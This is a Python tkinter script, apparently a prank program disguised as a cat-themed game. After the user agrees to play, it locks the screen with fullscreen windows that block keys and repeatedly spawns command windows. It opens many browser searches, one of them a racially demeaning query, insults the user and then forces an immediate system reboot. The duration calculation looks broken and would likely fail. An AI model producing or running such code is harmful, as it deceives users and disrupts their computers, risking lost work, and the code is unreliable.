import tkinter as tk
import os
import sys
import time
import threading
import webbrowser

def open_window():
    root = tk.Tk()
    root.title("Mim-Z'nin Oyun Alanı")
    root.geometry("400x300")

    message = "Miyav! Benimle oynamak ister misin, Senpai?"
    message_label = tk.Label(root, text=message, font=("Helvetica", 12))
    message_label.pack(pady=10)

    def on_click_yes():
        root.destroy()
        show_first_message_screen()

    yes_button = tk.Button(root, text="Evet, Oynarım!", command=on_click_yes)
    yes_button.pack(pady=10)

    def on_closing_main():
        root.deiconify()
        root.focus_force()

    root.protocol("WM_DELETE_WINDOW", on_closing_main)
    root.after(0, lambda: root.focus_force())
    root.mainloop()

def block_key(event):
    print(f"Bloklanan tuş: {event.keysym}")
    return "break"

def open_and_close_cmd_repeatedly(duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        os.system('start cmd /c "timeout 0.3 & exit"')
        time.sleep(0.15)

def search_on_edge():
    user_searches = ["tung tung tung sahur", "turabi"]
    z_gen_searches = ["agabubagaga ne demek", "only in ohio", "rizz nedir", "skibidi toilet",
                      "sigma erkek ne demek", "uwu ne demek", "based ne demek", "woke ne demek",
                      "NPC gibi davranmak", "devrim arabaları tofaş"]
    komik_eklemeler = ["roblox komik fotoğraflar", "siyahi adam komik fotoğraflar",
                       "komik anime kızları montaj", "kedi memleri 2024", "en garip tiktok akımları",
                       "minecraft fail anları", "komik futbol capsleri", "dede torun şakaları",
                       "yapay zeka komik cevaplar", "internet trolleri", "komik hayvan videoları derlemesi",
                       "yanlışlıkla çekilmiş komik fotoğraflar", "liselilerin komik tweetleri",
                       "oyunlardaki glitchler komik anlar"]
    all_searches = user_searches + z_gen_searches + komik_eklemeler
    edge_path = "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe"
    sekme_sayisi = 0
    for query in all_searches:
        try:
            webbrowser.register('edge', None, webbrowser.BackgroundBrowser(edge_path))
            webbrowser.get('edge').open_new_tab(f"https://www.google.com/search?q={query.replace(' ', '+')}")
            time.sleep(1)
            sekme_sayisi += 1
            if sekme_sayisi >= 20: # En fazla 20 sekme aç
                break
        except webbrowser.Error as e:
            print(f"Edge açılırken bir hata oluştu: {e}")
            break

def show_first_message_screen():
    message_screen = tk.Tk()
    message_screen.attributes('-fullscreen', True)
    message_screen.configure(bg='white')
    message_screen.bind("<Key>", block_key)

    label_text = "Senpai! Sen benim kedimsin artık 😼"
    label = tk.Label(message_screen, text=label_text, font=("Comic Sans MS", 36, "bold"), fg="purple")
    label.pack(pady=200, anchor=tk.CENTER)

    message_screen.after(2000, lambda: [message_screen.destroy(), show_edge_and_cmd()])

    message_screen.mainloop()

def show_edge_and_cmd():
    edge_cmd_screen = tk.Tk()
    edge_cmd_screen.attributes('-fullscreen', True)
    edge_cmd_screen.configure(bg='white')
    edge_cmd_screen.bind("<Key>", block_key)

    search_duration = len(search_on_edge.__code__.co_freevars[0]) + len(search_on_edge.__code__.co_freevars[1]) + len(search_on_edge.__code__.co_freevars[2]) # Arama sayısına göre dinamik süre
    threading.Thread(target=open_and_close_cmd_repeatedly, args=(search_duration + 5,)).start() # Arama süresine ek biraz süre
    threading.Thread(target=search_on_edge).start()

    edge_cmd_screen.after((search_duration + 5) * 1000 + 2000, lambda: [edge_cmd_screen.destroy(), show_second_white_screen()])

    edge_cmd_screen.mainloop()

def show_second_white_screen():
    white_screen_2 = tk.Tk()
    white_screen_2.attributes('-fullscreen', True)
    white_screen_2.configure(bg='white')
    white_screen_2.bind("<Key>", block_key)

    label_text = "Senpai! Sen tam bir aptalsın! 😼"
    label = tk.Label(white_screen_2, text=label_text, font=("Comic Sans MS", 36, "bold"), fg="red")
    label.pack(pady=200, anchor=tk.CENTER)

    def on_closing_second_screen():
        pass

    white_screen_2.protocol("WM_DELETE_WINDOW", on_closing_second_screen)

    white_screen_2.after(5000, cover_screen_with_cmd_and_reboot)

    white_screen_2.mainloop()

def cover_screen_with_cmd_and_reboot():
    for _ in range(25):
        os.system('start cmd')
        time.sleep(0.1)
    time.sleep(3)
    os.system('shutdown /r /t 1')

open_window()